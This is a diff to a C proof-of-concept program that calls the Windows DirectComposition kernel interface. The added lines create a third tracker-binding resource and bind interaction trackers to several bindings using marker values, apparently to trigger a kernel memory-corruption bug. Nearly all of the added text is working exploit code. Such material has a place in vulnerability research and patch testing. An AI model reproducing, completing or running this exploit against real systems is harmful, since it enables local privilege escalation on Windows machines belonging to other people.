@@ -40,6 +40,7 @@ DWORD szBuff[0x400];
 #define Tracker1 3
 #define Tracker2 4
 #define Tracker3 5
+#define TrackerBinding3 6
 
 pNtDCompositionCreateChannel NtDCompositionCreateChannel;
 pNtDCompositionProcessChannelBatchBuffer NtDCompositionProcessChannelBatchBuffer;
@@ -135,6 +136,47 @@ int main(int argc, TCHAR* argv[])
     ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasize, &dwArg1, &dwArg2);
     if (!NT_SUCCESS(ntStatus)) {
         printf("[-] Bind Tracker to the First TrackerBinding \n");
+        exit(-1);
+    }
+
+    printf("[+] Bind Tracker to the Second TrackerBinding\n");
+    szBuff[0] = Tracker1;
+    szBuff[1] = Tracker3;
+    szBuff[2] = 0x42424242;
+    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding2;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = datasize;
+    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasize);
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasize, &dwArg1, &dwArg2);
+    if (!NT_SUCCESS(ntStatus)) {
+        printf("[-] Bind Tracker to the Second TrackerBinding \n");
+        exit(-1);
+    }
+   
+    printf("[+] Create Third TrackerBinding Resource Object\n");
+    *(DWORD*)(pMappedAddress) = nCmdCreateResource;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding3;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = (DWORD)CInteractionTrackerBindingManagerMarshaler;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xC) = FALSE;
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10, &dwArg1, &dwArg2);
+    if (!NT_SUCCESS(ntStatus)) {
+        printf("[-] Fail to create Direct Composition Resource\n");
+        exit(-1);
+    }
+
+    printf("[+] Bind Tracker to the Third TrackerBinding\n");
+    szBuff[0] = Tracker2;
+    szBuff[1] = Tracker3;
+    szBuff[2] = 0x43434343;
+    *(DWORD*)pMappedAddress = nCmdSetBufferProperty;
+    *(HANDLE*)((PUCHAR)pMappedAddress + 4) = (HANDLE)TrackerBinding3;
+    *(DWORD*)((PUCHAR)pMappedAddress + 8) = 0;
+    *(DWORD*)((PUCHAR)pMappedAddress + 0xc) = datasize;
+    CopyMemory((PUCHAR)pMappedAddress + 0x10, szBuff, datasize);
+    ntStatus = NtDCompositionProcessChannelBatchBuffer(hChannel, 0x10 + datasize, &dwArg1, &dwArg2);
+    if (!NT_SUCCESS(ntStatus)) {
+        printf("[-] Bind Tracker to the Third TrackerBinding \n");
         exit(-1);
     }
 }
